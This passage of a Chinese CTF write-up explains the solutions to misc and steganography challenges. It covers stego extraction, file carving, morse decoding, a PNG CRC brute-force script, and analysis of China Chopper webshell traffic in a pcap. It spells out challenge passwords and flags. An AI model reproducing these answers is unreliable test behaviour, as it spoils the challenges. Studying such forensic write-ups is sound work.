分离出一个vmdk文件，使用7z解压，拿到文件，文件中有brainfuck，解密。</p><p><code>flag&#123;N7F5_AD5</code>。</p><p>另一半在文件<code>where_is_flag_part_two.txt</code>中，但是提示flag不在这里，很可能是ntf隐写。使用7z压缩也你能看到具有隐写数据。使用工具提取隐写数据，是ook编码，直接解码拿到flag。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/44.png" alt="44"></p><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>提示刷新，F5隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java Extract C:\Users\12521\Desktop\Misc.jpg</span><br><span class="line">Huffman decoding starts</span><br><span class="line">Permutation starts</span><br><span class="line">309504 indices shuffled</span><br><span class="line">Extraction starts</span><br><span class="line">Length of embedded file: 190 bytes</span><br><span class="line">(1, 31, 5) code used</span><br></pre></td></tr></table></figure><p>拿到一个压缩包，伪加密，拿到flag。</p><h3 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h3><p><code>strings</code>分析一下，最后末尾有十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# strings &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;meihuai.jpg&#39; | grep &quot;7312c31&quot; &gt; q.txt</span><br></pre></td></tr></table></figure><p>放入notepadd++，十六进制转换ascii。一群坐标画图 ，可以使用脚本，也可以使用kali的<code>gnuplot</code>,主要该工具去需要去掉<code>（）</code>、以及逗号变成空格。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gnuplot&gt; plot &#39;&#x2F;root&#x2F;q.txt&#39;</span><br></pre></td></tr></table></figure><h3 id="BJDCTF-2nd-圣火昭昭-y1ng"><a href="#BJDCTF-2nd-圣火昭昭-y1ng" class="headerlink" title="[BJDCTF 2nd]圣火昭昭-y1ng"></a>[BJDCTF 2nd]圣火昭昭-y1ng</h3><p>jpg文件，<code>stings</code>看到有图片附加属性直接，查看找到编码<code>諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code>，解码拿到密码。<code>gemlovecom</code>,根据题目提示去掉com。</p><p>jpg、拿到密码。想到<code>steghide</code>、<code>jphsiwn</code>都不好使，最后outguess解密。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# outguess -k &quot;gemlove&quot; -r &#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;sheng_huo_zhao_zhao.jpg&#39; .&#x2F;out.txt</span><br></pre></td></tr></table></figure><p>菜刀666</p><p>提示菜刀，应该与链接shell有关直接，搜索http流量，追踪TCP，第七个流可以看到，z2参数是一个图片的十六进制。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FFD8FFE000104A46494600010101007800780000FFDB00430001010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFDB00430101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101010101FFC0001108013901E203012200021101031101FFC4001F0000010501010101010100000000000000000102030405060708090A0BFFC400B5100002010303020403050504040000017D01020300041105122131410613516107227114328191A1082342B1C11552D1F02433627282090A161718191A25262728292A3435363738393A434445464748494A535455565758595A636465666768696A737475767778797A838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE1E2E3E4E5E6E7E8E9EAF1F2F3F4F5F6F7F8F9FAFFC4001F0100030101010101010101010000000000000102030405060708090A0BFFC400B51100020102040403040705040400010277000102031104052131061241510761711322328108144291A1B1C109233352F0156272D10A162434E125F11718191A262728292A35363738393A434445464748494A535455565758595A636465666768696A737475767778797A82838485868788898A92939495969798999AA2A3A4A5A6A7A8A9AAB2B3B4B5B6B7B8B9BAC2C3C4C5C6C7C8C9CAD2D3D4D5D6D7D8D9DAE2E3E4E5E6E7E8E9EAF2F3F4F5F6F7F8F9FAFFDA000C03010002110311003F00FC18823DB907E62481211D6493F86143D914E012BCF5E30056C4310192E7D0CC40EFFC30478E3B0DFF00FD8F352DA3DBB0AF0769F2C1FF00964839699CF3866C9C11CF719E33AD6F1B7C840EB930AB71C672D7327B0C1D99EC0632179FF49A8C75F376FF002FB9DFAD9BE65D66EDFE56D79EFADBB3D9AB5BE4AC95FB69D5455EDC28724C9C703CD238D89FC30A1F523AE3D4F6539D88632E4EE013080CA57FE58C5FC31A7FD34933F377E7DCD54B78F714DA0B00711038F9DC7DF9DFFD95E703FA6EAD98101D8A83702FF20FF9ED3779187FCF34391CF5F539AF568C36EFDF7BAD36F5BBDBBE9F146DE3D79F4DDAFBAFA2F93D1EFA2B35B4657B90A6428036314F7C5BC1F967CC7DDCF7391D0B1C6CDBA6D0BB70A4292B9FF963177918FF00CF47E3033B88C6324A8AAB020551D24F9B1EF7336781D4131A13C738C7BB606BDBC4064B82FF0030DF8EB34BD5635C7F021C671DBA0C9435EA528EDE56FF0087D3F357B745A42FE4566B5F3EFADB656B3F5B5B4ECDABD465BB78CFC85540620B421B811A1FBD7327FB47036E4F5E47DD4AD7B78F732141F2AFFA856EE73FBCB993B0C6D2573C63D81354E14C96DDF32EE5F39971FBC906365B45D72A300311C71E8A2B6A353921B19E3CE65FE151F72DA3C74E061B6F4C73F74E7D6A11DB4ED7B697DBEE4ADD3E1B69750478D5A5ABD6FA7E76F4BEEBD6FAD9CED1B70A9F9047F30DC7C956E3CD9070F3B8FEEA9FBBBBD30790D5A70C61400079997C2E7ADCCFD0B9C9E638B2703EEFA9059B15E24DBB830D8DB479C47FCB284E36C080E7E77380D9FA1CE18D694319272C446760DDD48B780F0101EF2CB9C63A9CF62C71D96D52D36DBB256F5B7CF6B59E91A89F0DDEBAE8DAEFEF6D6775BEFBADEF74BDEA76B3146A796CBA87191D4DCDC765F689339EA3D7A30AD2452C4863B81606661FF2DA5FE18131D634E99E871C7F05578D1890061095C8E9FE8D6F9E588FF9EB27FDF4739C7231A50AE31B1761DA7C90DD228BF8E77E9991F1F29FCB036D633F5BEB6DB7DBBBBBED67D1D9FC53B1DAD6FCB5F77B2E8F5D34D2F1D234D132A80AE1B9191F6865C7CEF91E5DAC479000C00D8E383D768274228FEF997E5F957CF2BFC080FC96B10E992061B1C7639C1CD6817E68D93E5C026DD58E3681FEB2EE5E31938F97F4E0569449911845DDC9F20360177FE3BA9472768C1DBBB8E3BED6AC65E7E49F7D96BFD6AEFDE7A5C6EBF0FD2FDED64BD15B4BAA7EFCF1A925B71F2C8502523FE5DE0E36DBC7C9FDEC9FC407AF3D58D68C719C8C811B6C191DAD6D880428FF00A6D367A9E72D83C9E2181154290BBF2FFB907ACF3FF14CF9CFEEE3C9DBDB8C673BB1A10A0C8209972FC64737574739FF00B631E7BFB74DD9ACDAEB7F56AFBBB79BE8FA6FAB5ACA08B4ECBBF65F774FD1EBF65E91A97B51272368F2D8A7C993C5B5B7F148DEB2C808E7A927B6401A502636140148563086E9145FC7732678DCDD573CF1D32AA6ABC49B465BF7A0BE6423ADD5C725625EE618F8071818E9D462FA2E776FF9BE651315FF0096B20FB96D191C045230D8F4CE385AC24EDAAFC7A256D55BBFE9A69185ED6AD2FBBF0EFD3A6BFCD696B29DA68D598C6B12F393F6753D80FF0059792FE5F213D303070B83A512AA04D8371DC7C80DFF002D661F7EE65CF444E4A0ED800F462628D02EFDE493F2FDA5978FFAE76916327A0F9B1C0E49CEDE6F221258B9DA428F3D97FE5945C7976B1FFB4C461B1CF639C3679DEFE9AF6B6DF75B97ABD1AEBC8EF69A6D6FDD6FAEDF377BF6D6FD1CD5A7823CED0BFBD01C9894FF00CBD5CE7E69E4073FB</span><br></pre></td></tr></table></figure><p>保存之后是一个密码。</p><p>第九个流最后数据返回包是一个压缩包。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-&gt;|PK...........KQ...4...(.......flag.txtC......cS...J..Ea.v....&amp;e$K..2%..$..,..&#x3D;.J..1p..p46.PK..?..........KQ...4...(.....$....... .......flag.txt</span><br><span class="line">. .........J. ..p...o2.p...o2.p..PK..........Z...Z.....well,you need passwd!.|&lt;-</span><br></pre></td></tr></table></figure><p><code>|&lt;-</code>是菜刀的标志，十六进制标志为<code>2D3E7C</code>。</p><h3 id="BJDCTF2020-认真你就输了"><a href="#BJDCTF2020-认真你就输了" class="headerlink" title="[BJDCTF2020]认真你就输了"></a>[BJDCTF2020]认真你就输了</h3><h3 id="BJDCTF-2nd-EasyBaBa"><a href="#BJDCTF-2nd-EasyBaBa" class="headerlink" title="[BJDCTF 2nd]EasyBaBa"></a>[BJDCTF 2nd]EasyBaBa</h3><p>拿到一个图片，文件大小很大，所以直接<code>foremost</code>。拿到一个压缩包，解压里面还有个jpg图片。打开之后发现损坏，放入winhex，尝试修补头，但是发现是个avi文件。视频隐写。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i flag.mp4 -f image2 image%d.jpg</span><br></pre></td></tr></table></figure><p>扫描二维码得到flag。</p><h3 id="SWPU2019-神奇的二维码"><a href="#SWPU2019-神奇的二维码" class="headerlink" title="[SWPU2019]神奇的二维码"></a>[SWPU2019]神奇的二维码</h3><p>扫码，假flag。binwalk分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~&#x2F;桌面&#x2F;steady$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;BitcoinPay.png</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             PNG image, 400 x 400, 8-bit&#x2F;color RGBA, non-interlaced</span><br><span class="line">28932         0x7104          RAR archive data, version 5.x</span><br><span class="line">29034         0x716A          RAR archive data, version 5.x</span><br><span class="line">94226         0x17012         RAR archive data, version 5.x</span><br></pre></td></tr></table></figure><p>其中一个文件–<code>YXNkZmdoamtsMTIzNDU2Nzg5MA==</code>解码<code>asdfghjkl1234567890</code>，另一个压缩包的密码，得到一个jpg。</p><p>flag.doc文件，一串很长的字符串，<code>Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVjBaS2RHVkdXbFpOYWtFeFZtcEJlRll5U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFjVkZ0UmxSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1pFWlNUbFpVVmtwV2JURXdWakZXZEZOc1dsaGlSa3BZV1ZkMGQyUnNjRmRYYlVaclVsUkdWbFpYZUZOVWJVWTJVbFJHVjJFeVVYZFdha1pYWkVaT2NscEdhR2xTTW1ob1YxZDBZVll3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSazVYVWpOb2IxWXhaRFJWTVVsNVZXNU9XR0pIVWxsWmJGWmhZMnhXY1ZGVVJsTk5WMUo1VmpJMWExWXdNVVZTYkdSYVRVWmFNMVpxU2t0V1ZrcFpXa1p3YkdFelFrbFdiWEJIVkRKU1YxWnVUbGhpVjJoeldXeG9iMkl4V25STldHUlZUV3RzTlZWdGRHdGhiRXAwVld4c1dtSkdXbWhaTW5oWFl6RldjbHBHWkdsU2JrSmFWMnhXYjJFeFdYZE5WVlpUWVRGd1YxbHJXa3RUUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGaFhTRUpJVmtSS1UxWXhXblZVYkdocFZqTm9WVlpHWTNoaU1sSnpWMjVTVGxkSFVsWlVWM1J6VGxaV2RHUkhkRmhTTUhCSlZsZDRjMWR0U2tkWGJXaGFUVlp3YUZwRlpGTlRSa3B5VGxaT2FXRXdjRWxXYlhCTFRrWlJlRmRzYUZSaE1sSnhWVzB4TkdGR1ZYZGhSVTVUVW14d2VGVXlkR0ZpUmxwelUyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhYYmxaV1lsZG9WRmxZY0ZkbGJHUllaVWM1YVUxWFVraFdNalZUVkd4T1NHRkdRbFppVkVVd1ZtcEdVMVp0UmtoUFZtaFRUVWhDTlZaSGVHRmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnNObEpzWkdwaVNFSklWMnRrYzFVeVNuSlRiVVpYVFc1b1dGbHFTa1psUm1SWldrVTFWMVpzY0ZWWFYzUnJWVEZzVjFWc1dsaGliVkp6V1d0YWQyVkdWblJOVldSVlRXdHdSMVl5ZUhkWGJGcFhZMGRvV21FeVVrZGFWM2hIWTIxS1IxcEdaRTVOUlhCS1ZtMTBVMU14VlhoWFdHaFlZbXhhVmxsclpHOWpSbHB4VkcwNWEySkdjRWhXYlRBMVZXc3hXRlZ1Y0ZkTmFsWk1WakJrUzFOR1ZuUlNiR1JvWVRGd1NWWkhkR0ZaVm1SSVZXdG9hMUl5YUhCVmJHaENaREZhYzFwRVVtcE5WMUl3VlRKMGIyRkdTbk5UYkdoVlZteHdNMVl3V25KbFJtUnlaRWR3YVZacmNFbFdiR1EwWVRKR1YxTnVVbEJXUlRWWVZGYzFiMWRHYkhGVGExcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsaVZrcDZWMWQwWVdReVZrZFdibEpPVmxkU1ZsUlhkSGRTTVZsNVpVaGtXR0pHY0ZoWk1HaExWakZhUmxkcmVGZE5WbkJJV1RJeFMxSXhjRWRhUlRWT1VsaENTMVp0TVRCVk1VMTRWbGhvV0ZkSGFGbFpiWGhoVm14c2NscEhPV3BTYkhCNFZrY3dOVll4V25SVmJHaFhWak5OTVZaWGMzaFhSbFp5WVVaa1RtRnNXbFZXYTJRMFdWWktjMVJ1VG1oU2JGcFlWRlJLYjFOV1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFZXczVXbFpGTlVSVWJGcGhVMGRXU0ZKdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp1Y0Zka2JGbDNWMjVPVDJKRmNIcFhhMlIzWVZaT1JsTnJiRmhXYkZweVdYcEdWbVF3TVVsaFJrNW9Za2hDV1ZkV1pEQmtiVkY0VjJ4V1UySkdjSE5WYlRGVFRWWlZlV042UmxkTlZuQjZXVEJhVjFkR1duTlRhMmhoVWtWYWNsVnFTa3RUVmxKMFlVWk9iR0pZYUZGV2ExcGhXVmRSZVZaclpGZGliRXBQVm14a1UxWXhVbGhrU0dSWFRWZDRlVlpYTVVkWFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkNhMUl4U1hsU2EyaHBVbXMxY0ZsVVFuZE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXVlZhVjJOV1RuUlBWbVJUWWtWd1dsWkhlR3BPVmxsNFYyNU9hbEpYYUZsV2ExVXhaR3hzVjFaWWFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Um10V01WcDFVMnhDVjJKSVFuZFdiWFJYVm0xUmVGZHVSbEppVlZwaFZtMHhVMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFNYbFNhMlJVWW1zMVZWbHNWbUZXYkZwMFpVaGtUazFXY0hsV01qRkhZV3hhY21ORVJsaGhNWEJRVmtkNFlXTnRUa1ZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaa1YxVnJaR3ROYTFwSVZqSjRWMVV5UlhoalNFNVdZbFJHVkZwWGVITldiR1J6Vkcxb1UxWkZXalpXVkVreFlURlplRmRZY0ZaaVYyaFhXbGQwWVZsV2NGWlhiR1JxVFd0YVIxUXhXbXRoUjFaelYycGFWMDFYVVhkWFZtUlNaVlphY2xwR1pHbGlSWEJRVm0xNGExVXhXWGhWYkdoclUwZFNXRlJXV25kTlJtdDNXa1ZrV0ZJd2NFaFpNRnB2VjJzeFNGVnVXbGROYm1ob1ZqQmFWMk5zY0VoU2JHUlhUVlZ3VWxac1pIZFRNVTE0VTFoc1UyRXlVbTlWYlhoTFZrWmFjMkZGVGxSTlZuQjRWVzB4UjFack1WWk5WRkpYVm0xb2VsWnNXbXRUUjBaSVlVWmFUbEp1UW05V2JURTBZekpPYzFwSVNtdFNNMEpVV1d0YWQwNUdXbGhOVkVKT1VteHNORll5TlU5aGJFcFlZVVpvVjJGck5WUldSVnB6VmxaR1dXRkdUbGRoTTBJMlZtdGtORmxXVlhsVGExcFlWMGhDV0Zac1duZFNNVkY0VjJ0T1ZtSkZTbFpVVlZGM1VGRTlQUT09</code>。</p><p>循环base64解密，拿到第二个<code>comEON_YOuAreSOSoS0great</code>，使用改密码解压一个文件夹拿到一个<code>good.MP3</code>。</p><p>对于good文件，先导出文件，然后使用工具，拿到莫斯密码。导出文件。</p><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/46.png" alt="46"></p><p>使用工具解码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ morse2ascii /home/steady/桌面/steady/_BitcoinPay.png.extracted/<span class="number">55.</span>wav</span><br><span class="line">MORSE2ASCII <span class="number">0.2</span></span><br><span class="line">by Luigi Auriemma</span><br><span class="line">e-mail: aluigi@autistici.org</span><br><span class="line">web:    aluigi.org</span><br><span class="line"></span><br><span class="line">- open /home/steady/桌面/steady/_BitcoinPay.png.extracted/<span class="number">55.</span>wav</span><br><span class="line">  wave size      <span class="number">577010</span></span><br><span class="line">  format tag     <span class="number">1</span></span><br><span class="line">  channels:      <span class="number">1</span></span><br><span class="line">  samples/sec:   <span class="number">8000</span></span><br><span class="line">  avg/bytes/sec: <span class="number">16000</span></span><br><span class="line">  block align:   <span class="number">2</span></span><br><span class="line">  bits:          <span class="number">16</span></span><br><span class="line">  samples:       <span class="number">288505</span></span><br><span class="line">  bias adjust:   <span class="number">-162</span></span><br><span class="line">  volume peaks:  <span class="number">-23125</span> <span class="number">23125</span></span><br><span class="line">  normalize:     <span class="number">9642</span></span><br><span class="line">  resampling to  <span class="number">8000</span>hz</span><br><span class="line"></span><br><span class="line">- decoded morse data:</span><br><span class="line">tt  ttt  ete  eee  e  ee  eee  eeet  e  ete  tett  eeet  e  ete  tett  e  et  eee  tett </span><br></pre></td></tr></table></figure><p><code>t</code>换<code>-</code>，<code>e</code>换<code>.</code>，转码得<code>morseisveryveryeasy</code>，即flag。</p><h3 id="BJDCTF2020-你猜我是个啥"><a href="#BJDCTF2020-你猜我是个啥" class="headerlink" title="[BJDCTF2020]你猜我是个啥"></a>[BJDCTF2020]你猜我是个啥</h3><p>根据题目名称。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady@steady:~$ file &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip</span><br><span class="line">&#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;_BitcoinPay.png.extracted&#x2F;flag.zip: PNG image data, 245 x 256, 8-bit&#x2F;color RGBA, non-interlaced</span><br></pre></td></tr></table></figure><p>修改PNG后缀，一个二维码。扫描假flag。</p><p>使用<code>strings</code>查看到flag。</p><h3 id="BJDCTF2020-一叶障目"><a href="#BJDCTF2020-一叶障目" class="headerlink" title="[BJDCTF2020]一叶障目"></a>[BJDCTF2020]一叶障目</h3><p>CRC爆破修改高度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">file = <span class="string">&#x27;1.png&#x27;</span>  <span class="comment">#注意，1.png图片要和脚本在同一个文件夹下哦~</span></span><br><span class="line">fr = open(file,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">data = bytearray(fr[<span class="number">12</span>:<span class="number">29</span>])</span><br><span class="line">crc32key = eval(str(fr[<span class="number">29</span>:<span class="number">33</span>]).replace(<span class="string">&#x27;\\x&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;b&#x27;&quot;</span>,<span class="string">&#x27;0x&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment">#crc32key = 0xCBD6DF8A #补上0x，copy hex value</span></span><br><span class="line"><span class="comment">#data = bytearray(b&#x27;\x49\x48\x44\x52\x00\x00\x01\xF4\x00\x00\x01\xF1\x08\x06\x00\x00\x00&#x27;)  #hex下copy grep hex</span></span><br><span class="line">n = <span class="number">4095</span> <span class="comment">#理论上0xffffffff,但考虑到屏幕实际，0x0fff就差不多了</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> range(n):<span class="comment">#高和宽一起爆破</span></span><br><span class="line">    width = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, w))<span class="comment">#q为8字节，i为4字节，h为2字节</span></span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> range(n):</span><br><span class="line">        height = bytearray(struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>, h))</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">            data[x+<span class="number">4</span>] = width[x]</span><br><span class="line">            data[x+<span class="number">8</span>] = height[x]</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">        crc32result = zlib.crc32(data)</span><br><span class="line">        <span class="keyword">if</span> crc32result == crc32key:</span><br><span class="line">            print(width,height)</span><br><span class="line">            <span class="comment">#写文件</span></span><br><span class="line">            newpic = bytearray(fr)</span><br><span class="line">            <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">4</span>):</span><br><span class="line">                newpic[x+<span class="number">16</span>] = width[x]</span><br><span class="line">                newpic[x+<span class="number">20</span>] = height[x]</span><br><span class="line">            fw = open(file+<span class="string">&#x27;.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)<span class="comment">#保存副本</span></span><br><span class="line">            fw.write(newpic)</span><br><span class="line">            fw.close</span><br></pre></td></tr></table></figure><p>使用binwalk分离。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@root:~&#x2F;桌面&#x2F;flag# binwalk -e ezbb_r.png </span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             JPEG image data, JFIF standard 1.01</span><br><span class="line">30            0x1E            TIFF image data, big-endian, offset of first image directory: 8</span><br><span class="line">28673         0x7001          End of Zip archive</span><br><span class="line"></span><br><span class="line">root@root:~&#x2F;桌面&#x2F;flag# dd if&#x3D;&#39;&#x2F;root&#x2F;桌面&#x2F;flag&#x2F;ezbb_r.jpg&#39;  of&#x3D;flag.zip skip&#x3D;28673 bs&#x3D;1</span><br><span class="line">记录了22+0 的读入</span><br><span class="line">记录了22+0 的写出</span><br></pre></td></tr></table></figure><p>可以看到有压缩包，进而使用dd命令。但是分离出来的压缩包是错误的。</p><p>使用<code>strings</code>命令没有发现，直接拖入winhex查看原因，搜索FFD9或者504B，发现jpg结尾有一个504B，修改后面的值为zip压缩头，解压拿到一个文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">                                                              </span><br><span class="line">                                                              </span><br><span class="line">##############    ##      ##    ##########  ##############    </span><br><span class="line">##          ##  ####  ####  ######  ##      ##          ##    </span><br><span class="line">##  ######  ##    ######      ##    ##      ##  ######  ##    </span><br><span class="line">##  ######  ##  ####  ##  ##      ##        ##  ######  ##    </span><br><span class="line">##  ######  ##      ##  ##      ##  ####    ##  ######  ##    </span><br><span class="line">##          ##  ##  ##        ####          ##          ##    </span><br><span class="line">##############  ##  ##  ##  ##  ##  ##  ##  ##############    </span><br><span class="line">                        ##    ##        ##                    </span><br><span class="line">##########  ##########  ####  ##  ##  ######  ##  ##  ##      </span><br><span class="line">##    ####    ##  ##      ##    ##  ######  ##############    </span><br><span class="line">####      ######  ##  ####  ####    ##    ##    ####  ##      </span><br><span class="line">######  ####    ########    ######        ##########  ##      </span><br><span class="line">####  ########    ##  ##  ##  ######              ######      </span><br><span class="line">####      ##  ########  ##  ##  ##  ####  ##########  ####    </span><br><span class="line">    ##########  ##        ##  ##        ####  ##    ####      </span><br><span class="line">##########    ####  ##  ##    ##    ######    ##  ##  ##      </span><br><span class="line">######    ####          ####  ##  ####            ####        </span><br><span class="line">########        ##        ####      ######  ##  ####  ####    </span><br><span class="line">##  ##  ########      ####    ##    ##                        </span><br><span class="line">##    ##      ##      ##      ####  ######  ####  ##    ##    </span><br><span class="line">##  ####    ####      ##        ######################  ##    </span><br><span class="line">                ####    ####    ######  ##      ##  ######    </span><br><span class="line">##############  ######    ######      ####  ##  ##            </span><br><span class="line">##          ##    ####  ####  ##      ####      ##            </span><br><span class="line">##  ######  ##  ####    ##  ####  ####  ##################    </span><br><span class="line">##  ######  ##  ##                        ##          ####    </span><br><span class="line">##  ######  ##  ##########    ##          ####  ####  ##      </span><br><span class="line">##          ##  ########    ##  ##    ####  ##  ##    ##      </span><br><span class="line">##############  ########      ##########  ####  ##  ##        </span><br><span class="line">                                                              </span><br><span class="line">                                                             </span><br></pre></td></tr></table></figure><p>像一个二维码，放入notepad++，把空格替换为0，把#替换为1。使用脚本进行转换。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">length = <span class="number">58</span></span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (length*<span class="number">5</span>, length*<span class="number">5</span>))</span><br><span class="line"><span 